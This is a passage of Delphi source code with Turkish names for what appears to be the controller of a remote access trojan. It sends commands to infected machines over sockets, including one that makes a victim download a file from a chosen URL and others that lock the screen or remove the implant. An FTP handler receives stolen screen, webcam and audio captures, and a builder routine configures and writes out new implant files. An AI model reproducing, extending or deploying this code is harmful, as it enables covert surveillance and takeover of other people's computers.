scrollbox1.Visible:=true;
image1.Visible:=false;
end;

end;

procedure TForm1.FlatButton42Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/XPCC|'+inttostr(trackbar1.Position)+'|.');
end;

procedure TForm1.Grntsnal1Click(Sender: TObject);
begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PCC|'+inttostr(trackbar1.Position)+'|'+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;

procedure TForm1.FlatCheckBox18Click(Sender: TObject);
begin

if flatcheckbox18.Checked then begin
flatedit3.Enabled:=true;
flatedit8.Enabled:=true;
flatedit4.Enabled:=true;
flatedit5.Enabled:=true;
end;

if not flatcheckbox18.Checked then begin
flatedit3.Enabled:=false;
flatedit8.Enabled:=false;
flatedit4.Enabled:=false;
flatedit5.Enabled:=false;
end;

end;

procedure TForm1.FlatButton43Click(Sender: TObject);
var
bilgi1,bilgi2:String;
begin
try
bilgi1 := inputbox(baslik,cmesaj[161],'25');
if bilgi1='' then exit;
bilgi2 := inputbox(baslik,cmesaj[162],'1500');
if bilgi2='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/AVC|'+inttostr(trackbar1.Position)+'|'+bilgi1+'|'+bilgi2+'|.');
except on exception do exit;
end;
end;

procedure TForm1.FlatButton27Click(Sender: TObject);
begin
baspanelecekvurbeni;
end;

procedure TForm1.FtpServer1RetrSessionConnected(Sender: TObject;
  Client: TFtpCtrlSocket; Data: TWSocket; Error: Word);
begin
bl:=bl+1;
gidendosya(inttostr(client.DataSocket.Handle),client.GetPeerAddr,extractfilename(client.FileName),cmesaj[163])
end;

procedure TForm1.FlatButton49Click(Sender: TObject);
var
bilgi1,bilgi2:String;
begin
try
bilgi1 := inputbox(baslik,cmesaj[164],'http://site/dosya.exe');
if bilgi1='' then exit;
bilgi2 := inputbox(baslik,cmesaj[165],'C:\dosya.exe');
if bilgi2='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/INDIR|'+bilgi1+'|'+bilgi2+'|.');
except on exception do exit;
end;
end;

procedure TForm1.iptal2Click(Sender: TObject);
begin
ftpsktiretseyi[strtoint(listview3.Selected.Caption)]:=True;
listview3.Selected.ImageIndex:=2;
listview3.Selected.Caption:=cmesaj[159];
end;

procedure TForm1.EkranKapla1Click(Sender: TObject);
begin
try
if form1.flatcheckbox2.Checked then begin
if onayla(listbox2.Items.Strings[listbox2.ItemIndex]) then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PGSTER '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
if form1.flatcheckbox2.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/EKAPLA '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
except on exception do exit;
end;
end;

procedure TForm1.Kilitle1Click(Sender: TObject);
begin
try
if form1.flatcheckbox2.Checked then begin
if onayla(listbox2.Items.Strings[listbox2.ItemIndex]) then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PGSTER '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
if form1.flatcheckbox2.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PK '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
except on exception do exit;
end;
end;

procedure TForm1.KilidiA1Click(Sender: TObject);
begin
try
if form1.flatcheckbox2.Checked then begin
if onayla(listbox2.Items.Strings[listbox2.ItemIndex]) then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PGSTER '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
if form1.flatcheckbox2.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/KC '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
except on exception do exit;
end;
end;

procedure TForm1.FlatButton60Click(Sender: TObject);
var Guid:TGuid;
temp : pWideChar;
begin
CoCreateGuid(Guid);
StringFromCLSID(Guid,temp);
flatedit27.Text := string(Temp);
end;

procedure TForm1.FlatEdit6KeyPress(Sender: TObject; var Key: Char);
begin
  if ( StrScan('0123456789.-',Key) <> nil ) or
     ( Key = Char(VK_BACK) ) then
  begin

  end
  else
    Key := #0;
end;

procedure TForm1.FlatEdit7KeyPress(Sender: TObject; var Key: Char);
begin
  if ( StrScan('0123456789.-',Key) <> nil ) or
     ( Key = Char(VK_BACK) ) then
  begin

  end
  else
    Key := #0;
end;

procedure TForm1.FlatEdit8KeyPress(Sender: TObject; var Key: Char);
begin
  if ( StrScan('0123456789.-',Key) <> nil ) or
     ( Key = Char(VK_BACK) ) then
  begin

  end
  else
    Key := #0;
end;

procedure TForm1.FlatEdit21KeyPress(Sender: TObject; var Key: Char);
begin
  if ( StrScan('0123456789.-',Key) <> nil ) or
     ( Key = Char(VK_BACK) ) then
  begin

  end
  else
    Key := #0;
end;

procedure TForm1.FlatEdit22KeyPress(Sender: TObject; var Key: Char);
begin
  if ( StrScan('0123456789.-',Key) <> nil ) or
     ( Key = Char(VK_BACK) ) then
  begin

  end
  else
    Key := #0;
end;

procedure TForm1.FlatEdit23KeyPress(Sender: TObject; var Key: Char);
begin
  if ( StrScan('0123456789.-',Key) <> nil ) or
     ( Key = Char(VK_BACK) ) then
  begin

  end
  else
    Key := #0;
end;

procedure TForm1.FlatEdit18KeyPress(Sender: TObject; var Key: Char);
begin
  if ( StrScan('0123456789.-',Key) <> nil ) or
     ( Key = Char(VK_BACK) ) then
  begin

  end
  else
    Key := #0;
end;

procedure TForm1.opluindirmeyiiptalet1Click(Sender: TObject);
begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('+kensil')
end;

procedure TForm1.SistemdenKaldr1Click(Sender: TObject);
begin
try
if onayla(cmesaj[170]) then ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/FATALITY');
except on exception do exit
end;
end;

procedure TForm1.FlatCheckBox9Click(Sender: TObject);
label
hede;
begin

if not flatcheckbox9.Checked then begin
flatedit27.Enabled:=false;
flatbutton60.Enabled:=False;
label21.Enabled:=False;
goto hede;
end;

if flatcheckbox9.Checked then begin
flatedit27.Enabled:=true;
flatbutton60.Enabled:=true;
label21.Enabled:=true;
end;

hede:
end;

procedure TForm1.FormDestroy(Sender: TObject);
var
yazlasi,yazzs,yaziyorumlagn,ftphedesi:string;
i:integer;
begin

for i:=0 to 15 do begin
ayarstr[i]:='-';
end;

if flatcheckbox1.Checked then ayarstr[0]:='X';
if flatcheckbox5.Checked then ayarstr[1]:='X';
if flatcheckbox14.Checked then ayarstr[2]:='X';
if flatcheckbox7.Checked then ayarstr[3]:='X';
if flatcheckbox11.Checked then ayarstr[4]:='X';
if flatcheckbox13.Checked then ayarstr[5]:='X';
if flatcheckbox21.Checked then ayarstr[6]:='X';
if flatcheckbox10.Checked then ayarstr[7]:='X';
if flatcheckbox2.Checked then ayarstr[8]:='X';
if flatcheckbox4.Checked then ayarstr[9]:='X';
if flatcheckbox6.Checked then ayarstr[10]:='X';
if flatcheckbox9.Checked then ayarstr[11]:='X';
if flatcheckbox15.Checked then ayarstr[12]:='X';
if flatcheckbox18.Checked then ayarstr[13]:='X';
if flatcheckbox3.Checked then ayarstr[14]:='X';
if flatradiobutton8.Checked then ayarstr[15]:='E';

for i:=0 to 15 do begin
yazlasi:=yazlasi+ayarstr[i]+'|';
end;

yazzs:='YOK';
if flatlistbox1.Items.Count > 0 then begin
yazzs:=inttostr(flatlistbox1.Items.Count)+'|';
for i:=0 to flatlistbox1.Items.Count - 1 do begin
yazzs:=yazzs+flatlistbox1.Items.Strings[i]+'|';
end;
end;

yaziyorumlagn:=encode64(flatedit6.Text+'|'+flatedit1.Text);
ftphedesi:=encode64(flatedit3.Text+'|'+flatedit8.Text+'|'+flatedit4.Text+'|'+flatedit5.Text);

if flatedit6.Text='' then yaziyorumlagn:=encode64('BUDAYOK');
if flatedit1.Text='' then yaziyorumlagn:=encode64('BUDAYOK');

kaydet(encode64(yazlasi)+ent+encode64(yazzs)+ent+yaziyorumlagn+ent+ftphedesi,ayardosyasi);
DeleteSysTrayIcon;
halt;
end;


procedure TForm1.BaglantyKes2Click(Sender: TObject);
var
i:integer;
begin
try
for i := 0 To ServerSocket1.Socket.ActiveConnections -1 do
begin
serversocket1.Socket.Connections[i].SendText('/BKES');
end;
except on exception do exit;
end;
end;

procedure TForm1.ProgramKapat2Click(Sender: TObject);
var
i:integer;
begin
try
for i := 0 To ServerSocket1.Socket.ActiveConnections -1 do begin
serversocket1.Socket.Connections[i].SendText('/INTIHAR');
end;
except on exception do exit;
end;
end;

procedure TForm1.Sistemdenkaldr2Click(Sender: TObject);
var
i:integer;
begin
try
if onayla(cmesaj[171]) then begin
for i := 0 To ServerSocket1.Socket.ActiveConnections -1 do begin
serversocket1.Socket.Connections[i].SendText('/FATALITY');
end;
end;
except on exception do exit;
end;
end;

procedure TForm1.IdleBozuluncaUyar1Click(Sender: TObject);
var
i:integer;
begin
try
for i := 0 To ServerSocket1.Socket.ActiveConnections -1 do begin
serversocket1.Socket.Connections[i].SendText('/IDLEUYAR');
end;
except on exception do exit;
end;
end;

procedure srvoku(dosya:string);
VAR
 fcontent,apnd : string;
 i: integer;
begin
  LoadServer(dosya,fcontent);
  i := length(fcontent);
  apnd := '';
  WHILE (i > 0) AND (fcontent[i] <> #00) DO begin
   apnd := fcontent[i] + apnd;
   i := i-1;
  end;
  if apnd='' then begin
  form1.label14.Font.Color:=clred;
  form1.label14.Caption:=form1.cmesaj[166]+extractfilename(dosya);
  exit;
  end;
  apnd:=decode64(apnd);
  form1.flatedit26.text := parcala(apnd,0);
  form1.flatedit25.text := parcala(apnd,1);
  form1.flatedit24.text := parcala(apnd,2);
  form1.flatedit10.text := parcala(apnd,3);
  form1.flatedit18.text := parcala(apnd,4);
  form1.flatedit20.text := '';
  form1.flatedit27.text := parcala(apnd,6);
  if parcala(apnd,7) = 'X' then form1.flatcheckbox6.Checked:=true else form1.flatcheckbox6.Checked:=false;
  if parcala(apnd,8) = 'X' then form1.flatcheckbox9.Checked:=true else form1.flatcheckbox9.Checked:=false;
  if parcala(apnd,9) = 'X' then form1.flatcheckbox15.Checked:=true else form1.flatcheckbox15.Checked:=false;

  form1.flatedit21.text := parcala(apnd,10);
  form1.flatedit22.text := parcala(apnd,11);
  form1.flatedit23.text := parcala(apnd,12);
  form1.flatedit29.text := parcala(apnd,13);
  form1.label14.Font.Color:=cllime;
  form1.label14.Caption:=form1.cmesaj[167]+extractfilename(dosya);
end;

procedure TForm1.FlatButton58Click(Sender: TObject);
begin
IF opendialog1.Execute THEN srvoku(opendialog1.FileName);
end;

procedure TForm1.FlatButton59Click(Sender: TObject);
VAR
 fcontent,kaydedilesii : string;
 i,y : integer;
 f : textfile;
 secenekler : array[0..2] of string;
begin
 IF savedialog1.Execute THEN begin
  kaydedilesii := savedialog1.FileName;
  extract(kaydedilesii+'_','DATAKESH');
  lhac(kaydedilesii+'_',kaydedilesii);
  deletefile(kaydedilesii+'_');
  sleep(100);
  LoadServer( kaydedilesii, fcontent );
 i := length(fcontent);
 for y:=0 to 2 do begin
 secenekler[y]:='-';
 end;
 if flatcheckbox6.Checked then secenekler[0]:='X';
 if flatcheckbox9.Checked then secenekler[1]:='X';
 if flatcheckbox15.Checked then secenekler[2]:='X';

 while (i>0) AND (fcontent[i]<>#00) DO
  i := i -1;
 fcontent := copy(fcontent,1,i);
 fcontent := fcontent + encode64(flatedit26.Text + '|' + flatedit25.Text+'|'+flatedit24.Text+'|'+flatedit10.Text+'|'+flatedit18.Text+'|'+encode64(strmd5(flatedit20.Text))+'|'+flatedit27.Text+'|'+secenekler[0]+'|'+secenekler[1]+'|'+secenekler[2]+'|'+flatedit21.Text+'|'+flatedit22.Text+'|'+flatedit23.Text+'0'+'|'+flatedit29.Text);
  AssignFile( f , kaydedilesii );
 Rewrite( f );
 write( f , fcontent );
 closefile( f );
 label14.caption:=cmesaj[168]+extractfilename(kaydedilesii);
end;
end;

procedure TForm1.FlatButton56Click(Sender: TObject);
begin
varsayilanlar;
end;

procedure TForm1.FlatButton38Click(Sender: TObject);
begin
if panel17.Visible then exit;
oglbaslat;
muzikbaslat;
flatbutton48.colorborder:=cllime;
flatbutton51.colorborder:=cllime;
flatbutton29.colorborder:=cllime;
flatbutton38.colorborder:=cllime;
flatbutton4.colorborder:=cllime;
flatbutton5.colorborder:=cllime;

flatbutton48.colorFocused:=clgreen;
flatbutton51.colorFocused:=clgreen;
flatbutton29.colorFocused:=clgreen;
flatbutton38.colorFocused:=clgreen;

flatbutton39.Colorfocused:=clgreen;
flatbutton39.ColorBorder:=cllime;

listview1.Visible:=false;
panel14.Visible:=false;
panel15.Visible:=False;
panel1.Visible:=false;
memo1.visible:=false;
listbox1.Visible:=false;
listbox2.Visible:=false;

flatbutton25.visible:=false;
flatbutton7.visible:=false;
flatbutton2.visible:=false;
flatedit2.visible:=false;

flatbutton38.colorborder:=clmaroon;
flatbutton38.colorFocused:=clmaroon;

alayibaslasin;
end;

procedure TForm1.Panel17Resize(Sender: TObject);
begin
glViewport(0, 0, panel17.Width, panel17.Height);    // Set the viewport for the OpenGL window
glMatrixMode(GL_PROJECTION);        // Change Matrix Mode to Projection
glLoadIdentity();                   // Reset View
gluPerspective(45.0, panel17.Width/panel17.Height, 1.0, 100.0);  // Do the perspective calculations. Last value = max clipping depth

glMatrixMode(GL_MODELVIEW);         // Return to the modelview matrix
glLoadIdentity();
end;

procedure TForm1.Panel17MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
var
cart,curt,hart,hurt:integer;
begin
cart:=0;
curt:=0;
hart:=0;
hurt:=0;

if alayibitti then begin
case x of
151..332 : hart:=1 else hart:=0;
end;

case y of
218..228 : hurt:=1 else hurt:=0;
end;

case x of
146..338 : cart:=1 else cart:=0;
end;

case y of
200..212 : curt:=1 else curt:=0;
end;

if cart+curt=2 then begin
screen.Cursor:=crhandpoint;
link:='https://psychip.net';
exit;
end;

if hart+hurt=2 then begin
screen.Cursor:=crhandpoint;
link:='mailto:root@psychip.net';
end
else
screen.Cursor:=crdefault;


if hart+hurt=0 then begin
if cart+curt=0 then screen.Cursor:=crdefault;
end;
end;

if cart+curt=0 then begin
if hart+hurt=0 then screen.Cursor:=crdefault;
end;

end;

procedure TForm1.Panel17MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if alayibitti then begin
if screen.Cursor=crhandpoint then begin
if button=mbLeft then ShellExecute(0,'open',pchar(link),nil,nil,SW_SHOW);
end;
end;
end;

procedure TForm1.FlatEdit7KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
if (key = 13) then begin
if flatedit7.Text='' then exit;
flatlistbox1.Items.Add(flatedit7.Text);
flatedit7.Clear;
key:=0;
end;
end;

procedure TForm1.FlatButton25Click(Sender: TObject);
begin
if flatcheckbox13.Checked then logsakla;
memo1.Clear;
end;

procedure TForm1.FlatRadioButton8Click(Sender: TObject);
begin
if flatradiobutton8.Checked then begin
inkilisce;
ecnebimesaj;
end;
end;

procedure TForm1.FlatRadioButton7Click(Sender: TObject);
begin
if flatradiobutton7.Checked then begin
turkce;
yerlimesaj;
end;
end;

procedure TForm1.FormShow(Sender: TObject);
begin
delay(100);
diloku;

//if enuygula then begin
inkilisce;
ecnebimesaj;
//end;

end;

procedure TForm1.ClientSocket1Connect(Sender: TObject; Socket: TCustomWinSocket);
var
paket:string;
begin
paket:='GET / HTTP/1.1'+#13#10;
paket:=paket+'Accept: */*'+#13#10;
paket:=paket+'Accept-Language: en'+#13#10;
paket:=paket+'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'+#13#10;
paket:=paket+'Host: checkip.dyndns.org'+#13#10;
paket:=paket+'Connection: Keep-Alive'+#13#10+#13#10;
socket.SendText(paket);
end;

procedure TForm1.ClientSocket1Read(Sender: TObject;
  Socket: TCustomWinSocket);
var
derle:string;
begin
derle:=clientsocket1.Socket.ReceiveText;
delete(derle,1,pos('Address',derle)+7);
derle:=copy(derle,1,pos('</',derle)-1);
derle:=trim(derle);
if flatcheckbox2.Checked then begin
clientsocket1.Active:=false;
end;

if destek.ip <> derle then begin
bilgi(cmesaj[173]+derle,1);
destek.ip:=derle;
sleep(1);
clientsocket1.Active:=false;
end;
end;


procedure TForm1.FlatCheckBox3Click(Sender: TObject);
label
asdsad;
begin
if flatcheckbox3.Checked then begin
desteklebeni;
label25.Visible:=True;
flatradiobutton1.Visible:=true;
flatradiobutton2.Visible:=true;
flatcheckbox18.Checked:=false;
flatcheckbox18.Enabled:=false;
goto asdsad;

if not flatcheckbox3.Checked then begin
destek.aktif:=false;
label25.Visible:=false;
flatradiobutton1.Visible:=false;
flatradiobutton2.Visible:=false;
flatcheckbox18.Enabled:=true;

asdsad:


end;
end;
end;


procedure TForm1.FtpServer1ClientDisconnect(Sender: TObject;
  Client: TFtpCtrlSocket; AError: Word);
  var
    i:integer;
  begin
try
for i := 0 to listview3.Items.Count -1 do begin
if listview3.Items[i].Caption = inttostr(client.DataSocket.HSocket) then begin
if listview3.Items[i].Caption <> cmesaj[156] then begin
listview3.items[i].Caption:=cmesaj[157];
listview3.Items[i].ImageIndex:=2;
end;
end;
end;
except on exception do exit;
end;
end;


procedure TForm1.FtpServer1RetrDataSent(Sender: TObject;
  Client: TFtpCtrlSocket; Data: TWSocket; AError: Word);
var
i:integer;
boyut:string;
label
bosisler;
  begin
if ftpsktiretseyi[client.DataSocket.Handle] then begin
try
client.DataSocket.Close;
client.DataStream.Free;
if assigned(client.datastream) then client.DataStream.Destroy;
ftpsktiretseyi[client.DataSocket.Handle]:=false;
finally
end;
end;

if client.ByteCount > 1048576 then begin
boyut:=inttostr(client.ByteCount div 1024 div 1024)+','+copy(inttostr(client.ByteCount mod 1024),1,2)+' mb';
goto bosisler;
end;

if client.ByteCount > 1024 then begin
boyut:=inttostr(client.ByteCount div 1024)+','+copy(inttostr(client.ByteCount mod 1024),1,1)+' kb';
goto bosisler;
end;

boyut:=inttostr(client.ByteCount)+ ' bayt';

bosisler:

try
for i := 0 to listview3.Items.Count -1 do begin
if listview3.Items[i].Caption = inttostr(client.DataSocket.Handle) then begin
listview3.items[i].SubItems.Strings[2]:=boyut;
end;
end;
except on exception do exit;
end;
end;

procedure TForm1.FtpServer1StorDataAvailable(Sender: TObject;
  Client: TFtpCtrlSocket; Data: TWSocket; Buf: PAnsiChar; Len: Integer;
  AError: Word);
var
i:integer;
boyut:string;
label
bosisler;
begin
if ftpsktiretseyi[client.DataSocket.HSocket] then begin
try
client.DataSocket.Close;
client.DataStream.Free;
if assigned(client.datastream) then client.DataStream.Destroy;
ftpsktiretseyi[client.DataSocket.HSocket]:=false;
finally
end;
exit;
end;

if client.DataSocket.ReadCount > 1048576 then begin
boyut:=inttostr(client.DataSocket.ReadCount div 1024 div 1024)+','+copy(inttostr(client.DataSocket.ReadCount mod 1024),1,2)+' mb';
goto bosisler;
end;

if client.DataSocket.ReadCount > 1024 then begin
boyut:=inttostr(client.DataSocket.ReadCount div 1024)+','+copy(inttostr(client.DataSocket.ReadCount mod 1024),1,1)+' kb';
goto bosisler;
end;

boyut:=inttostr(client.DataSocket.ReadCount)+ ' bayt';

bosisler:
try
for i := 0 to listview3.Items.Count -1 do begin
if listview3.Items[i].Caption = inttostr(client.DataSocket.HSocket) then begin
listview3.items[i].SubItems.Strings[2]:=boyut;
end;
end;
except on exception do exit;
end;
end;

procedure TForm1.FtpServer1ValidateRnTo(Sender: TObject;
  Client: TFtpCtrlSocket; var FilePath: TFtpString; var Allowed: Boolean);
begin
Allowed := ftpizin;
end;

procedure TForm1.FtpServer1ValidateRnFr(Sender: TObject;
  Client: TFtpCtrlSocket; var FilePath: TFtpString; var Allowed: Boolean);
begin
Allowed := ftpizin;
end;

procedure TForm1.FtpServer1ValidatePut(Sender: TObject;
  Client: TFtpCtrlSocket; var FilePath: TFtpString; var Allowed: Boolean);
begin
Allowed := aktarimkilidi;
end;



procedure TForm1.FtpServer1ValidateGet(Sender: TObject;
  Client: TFtpCtrlSocket; var FilePath: TFtpString; var Allowed: Boolean);
begin
Allowed := aktarimkilidi;
end;

procedure TForm1.FtpServer1ValidateDele(Sender: TObject;
  Client: TFtpCtrlSocket; var FilePath: TFtpString; var Allowed: Boolean);
begin
Allowed := ftpizin;
end;

procedure TForm1.FtpServer1StorSessionConnected(Sender: TObject;
  Client: TFtpCtrlSocket; Data: TWSocket; AError: Word);
var
dosia,kimliq:string;
begin
bl:=bl+1;
dosia:=client.FileName;
kimliq:=copy(dosia,1,pos('\',dosia)-1);
if not directoryexists(extractfilepath(paramstr(0))+'Download\'+kimliq) then mkdir(extractfilepath(paramstr(0))+'Download\'+kimliq);
dosia:=copy(dosia,pos('\',dosia)+1,length(dosia));
if copy(dosia,1,5)='ekran' then dosia:=cmesaj[151];
if copy(dosia,1,3)='cam' then dosia:=cmesaj[152];
if copy(dosia,1,3)='ses' then dosia:=cmesaj[153];
gelendosya(inttostr(client.DataSocket.HSocket),client.GetPeerAddr,dosia,kimliq);
end;


procedure TForm1.FtpServer1RetrSessionClosed(Sender: TObject;
  Client: TFtpCtrlSocket; Data: TWSocket; AError: Word);
var
str:string;
x,i:integer;
begin
bl:=bl-1;
str:=cmesaj[156];
x:=4;

if error <> 0 then begin
str:=cmesaj[157];
x:=2;
end;

try
for i := 0 to listview3.Items.Count -1 do begin
if listview3.Items[i].Caption = inttostr(client.DataSocket.Handle) then begin
listview3.items[i].Caption:=str;
listview3.Items[i].ImageIndex:=x;
end;
end;
except on exception do exit;
end;
if str=cmesaj[156] then begin
if flatcheckbox11.checked then PlayWavFile('efekt3');
end;
end;


procedure TForm1.FtpServer1MakeDirectory(Sender: TObject;
  Client: TFtpCtrlSocket; Directory: TFtpString; var Allowed: Boolean);
begin
Allowed := ftpizin;
end;


procedure TForm1.FtpServer1ClientConnect(Sender: TObject;
  Client: TFtpCtrlSocket; AError: Word);
begin
client.HomeDir:=extractfilepath(paramstr(0))+'Download';
end;


procedure TForm1.FtpServer1ChangeDirectory(Sender: TObject;
  Client: TFtpCtrlSocket; Directory: TFtpString; var Allowed: Boolean);
begin
Allowed := ftpizin;
end;

procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
if destek.aktif then begin
if flatradiobutton2.Checked then destek.ip:=socket.LocalAddress;
end;
end;

procedure TForm1.ClientSocket1Error(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
PlayWavFile('efekt6');
bilgi(cmesaj[174],3);
errorcode:=0;
clientsocket1.Active:=false;
end;

procedure TForm1.Image4DblClick(Sender: TObject);
begin
form1.Close;
end;

procedure TForm1.FlatButton53Click(Sender: TObject);
begin
close;
end;

procedure TForm1.FlatButton62Click(Sender: TObject);
begin
application.Minimize;
end;

procedure TForm1.FlatButton63Click(Sender: TObject);
begin
Hide;
end;

procedure TForm1.FtpServer1Authenticate(Sender: TObject;
  Client: TFtpCtrlSocket; UserName, Password: TFtpString;
  var Authenticated: Boolean);
begin
Authenticated := false;
if UserName = fkullanici then begin
if Password = fsifre then begin
Authenticated := true;
Memo1.Lines.Add('new ftp connection:'+client.GetPeerAddr);
end;
end;
end;

end.
